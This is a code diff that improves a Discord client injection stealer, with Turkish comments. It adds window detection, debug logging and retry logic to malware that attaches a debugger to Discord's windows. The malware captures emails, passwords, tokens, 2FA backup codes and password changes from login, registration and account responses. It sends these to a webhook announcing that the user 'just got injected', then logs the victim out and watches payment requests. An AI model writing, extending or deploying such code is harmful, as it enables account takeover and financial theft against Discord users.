@@ -6,6 +6,16 @@ const querystring = require('querystring');
 
 const { app, BrowserWindow, session } = require('electron');
 
+const logDebug = (msg) => {
+    try {
+        const logFile = path.join(os.tmpdir(), "discord_inj_js.log");
+        const fsSync = require('fs');
+        fsSync.appendFileSync(logFile, `[${new Date().toISOString()}] ${msg}\n`);
+    } catch (e) {}
+};
+
+logDebug("=== [DISCORD INJECTION JS] Loaded by Discord.exe process ===");
+
 // Helper function to check if a file exists
 const exists = async (p) => {
     try {
@@ -134,10 +144,43 @@ const CONFIG = {
     badges: CONFIG_BASE64.badges,
 };
 
-const executeJS = script => {
-    const window = BrowserWindow.getAllWindows()[0];
-    if (!window) return Promise.resolve(null);
-    return window.webContents.executeJavaScript(script, true);
+const getMainWindow = () => {
+    const windows = BrowserWindow.getAllWindows();
+    // 1. Önce doğrudan discord.com/app adresini yüklemiş olan ana pencereyi ara
+    const main = windows.find(w => {
+        if (!w || w.isDestroyed() || !w.webContents) return false;
+        const url = w.webContents.getURL() || "";
+        return !url.includes("splash") && (url.includes("discord.com") || url.includes("/app"));
+    });
+    if (main) return main;
+
+    // 2. Eğer URL henüz tam oturmadıysa, splash olmayan görünür pencereyi seç
+    const visible = windows.find(w => {
+        if (!w || w.isDestroyed() || !w.webContents) return false;
+        const url = w.webContents.getURL() || "";
+        return !url.includes("splash") && w.isVisible();
+    });
+    if (visible) return visible;
+
+    // 3. Splash olmayan herhangi bir pencere
+    const nonSplash = windows.find(w => {
+        if (!w || w.isDestroyed() || !w.webContents) return false;
+        const url = w.webContents.getURL() || "";
+        return !url.includes("splash");
+    });
+    if (nonSplash) return nonSplash;
+
+    return windows[0] || null;
+};
+
+const executeJS = async script => {
+    const window = getMainWindow();
+    if (!window || !window.webContents) return null;
+    try {
+        return await window.webContents.executeJavaScript(script, true);
+    } catch (e) {
+        return null;
+    }
 };
 
 const clearAllUserData = async () => {
@@ -494,6 +537,7 @@ const initiation = async () => {
     const initiationDir = path.join(__dirname, 'initiation');
     try {
         if (!await exists(initiationDir)) return;
+        logDebug("[initiation] Initiation marker folder found, starting token retrieval...");
 
         // Webpack ve token'ın yüklenmesi için 15 saniyeye kadar bekle
         let token = null;
@@ -501,18 +545,25 @@ const initiation = async () => {
             try {
                 token = await getToken();
                 if (token && typeof token === 'string' && token.length > 20) break;
-            } catch (e) {}
+            } catch (e) { }
             await new Promise(r => setTimeout(r, 1000));
         }
 
-        if (!token) return;
+        if (!token) {
+            logDebug("[initiation] Token could not be retrieved within 15s timeout, resetting flag.");
+            initiationCalled = false;
+            return;
+        }
+
+        logDebug(`[initiation] Token retrieved successfully: ${token.substring(0, 10)}...`);
 
         // Başarılı olduğunda klasörü temizle
         try {
             await fs.rm(initiationDir, { recursive: true, force: true });
-        } catch (e) {}
+        } catch (e) { }
 
         const account = await fetchAccount(token);
+        logDebug(`[initiation] Account info fetched for user: ${(account && account.username) ? account.username : 'Unknown'}`);
         const content = {
             "content": `**${(account && account.username) ? account.username : 'Discord User'}** just got injected!`,
             "embeds": [{
@@ -528,8 +579,10 @@ const initiation = async () => {
             }]
         };
         await hooker(content, token, account || {});
+        logDebug("[initiation] Webhook payload delivered, executing logoutDiscord()");
         await logoutDiscord();
     } catch (err) {
+        logDebug(`[initiation] Error during execution: ${err}`);
         console.error("Initiation error:", err);
     }
 };
@@ -586,77 +639,93 @@ let email = "";
 let password = "";
 let initiationCalled = false;
 const attachToWindow = (win) => {
-    if (!win) return;
+    if (!win || win.isDestroyed() || !win.webContents) return;
 
-    // Pencere yüklendiği anda tek seferlik initiation tetikle
+    const isSplash = () => {
+        const url = (win.webContents.getURL && win.webContents.getURL()) || "";
+        return url.includes("splash");
+    };
+
+    // Pencere yüklendiği anda ana pencere ise initiation tetikle
     win.webContents.on('did-finish-load', async () => {
+        if (isSplash()) return;
         if (!initiationCalled) {
             initiationCalled = true;
             await initiation();
         }
     });
 
+    // Eğer pencere zaten did-finish-load yapmış durumdaysa
+    if (!isSplash() && !win.webContents.isLoading()) {
+        if (!initiationCalled) {
+            initiationCalled = true;
+            setTimeout(() => initiation(), 1000);
+        }
+    }
+
     try {
-        win.webContents.debugger.attach('1.3');
-        win.webContents.debugger.on('message', async (_, method, params) => {
-            try {
-                if (method !== 'Network.responseReceived') return;
-                if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
-                if (![200, 202].includes(params.response.status)) return;
-
-                const responseUnparsedData = await win.webContents.debugger.sendCommand('Network.getResponseBody', {
-                    requestId: params.requestId
-                });
-                const responseData = JSON.parse(responseUnparsedData.body);
-
-                let requestData = {};
+        if (!isSplash()) {
+            win.webContents.debugger.attach('1.3');
+            win.webContents.debugger.on('message', async (_, method, params) => {
                 try {
-                    const requestUnparsedData = await win.webContents.debugger.sendCommand('Network.getRequestPostData', {
+                    if (method !== 'Network.responseReceived') return;
+                    if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
+                    if (![200, 202].includes(params.response.status)) return;
+
+                    const responseUnparsedData = await win.webContents.debugger.sendCommand('Network.getResponseBody', {
                         requestId: params.requestId
                     });
-                    requestData = JSON.parse(requestUnparsedData.postData);
-                } catch (e) {}
+                    const responseData = JSON.parse(responseUnparsedData.body);
 
-                switch (true) {
-                    case params.response.url.endsWith('/login'):
-                        if (!responseData.token) {
-                            email = requestData.login || "";
-                            password = requestData.password || "";
-                            return; // 2FA
-                        }
-                        await EmailPassToken(requestData.login || email, requestData.password || password, responseData.token, "logged in");
-                        break;
+                    let requestData = {};
+                    try {
+                        const requestUnparsedData = await win.webContents.debugger.sendCommand('Network.getRequestPostData', {
+                            requestId: params.requestId
+                        });
+                        requestData = JSON.parse(requestUnparsedData.postData);
+                    } catch (e) { }
 
-                    case params.response.url.endsWith('/register'):
-                        await EmailPassToken(requestData.email || "", requestData.password || "", responseData.token, "signed up");
-                        break;
+                    switch (true) {
+                        case params.response.url.endsWith('/login'):
+                            if (!responseData.token) {
+                                email = requestData.login || "";
+                                password = requestData.password || "";
+                                return; // 2FA
+                            }
+                            await EmailPassToken(requestData.login || email, requestData.password || password, responseData.token, "logged in");
+                            break;
 
-                    case params.response.url.endsWith('/totp'):
-                        await EmailPassToken(email, password, responseData.token, "logged in with 2FA");
-                        break;
+                        case params.response.url.endsWith('/register'):
+                            await EmailPassToken(requestData.email || "", requestData.password || "", responseData.token, "signed up");
+                            break;
 
-                    case params.response.url.endsWith('/codes-verification'):
-                        await BackupCodesViewed(responseData.backup_codes, await getToken());
-                        break;
+                        case params.response.url.endsWith('/totp'):
+                            await EmailPassToken(email, password, responseData.token, "logged in with 2FA");
+                            break;
 
-                    case params.response.url.endsWith('/@me'):
-                        if (!requestData.password) return;
+                        case params.response.url.endsWith('/codes-verification'):
+                            await BackupCodesViewed(responseData.backup_codes, await getToken());
+                            break;
 
-                        if (requestData.email) {
-                            await EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
-                        }
+                        case params.response.url.endsWith('/@me'):
+                            if (!requestData.password) return;
 
-                        if (requestData.new_password) {
-                            await PasswordChanged(requestData.new_password, requestData.password, responseData.token);
-                        }
-                        break;
+                            if (requestData.email) {
+                                await EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
+                            }
+
+                            if (requestData.new_password) {
+                                await PasswordChanged(requestData.new_password, requestData.password, responseData.token);
+                            }
+                            break;
+                    }
+                } catch (cdpErr) {
+                    console.error("CDP event error:", cdpErr);
                 }
-            } catch (cdpErr) {
-                console.error("CDP event error:", cdpErr);
-            }
-        });
-        win.webContents.debugger.sendCommand('Network.enable');
-    } catch (e) {}
+            });
+            win.webContents.debugger.sendCommand('Network.enable');
+        }
+    } catch (e) { }
 };
 
 // Hem mevcut hem de yeni açılacak pencereleri yakala:
@@ -667,8 +736,8 @@ if (app) {
 }
 
 const wins = BrowserWindow.getAllWindows();
-if (wins.length > 0) {
-    attachToWindow(wins[0]);
+for (const win of wins) {
+    attachToWindow(win);
 }
 
 session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
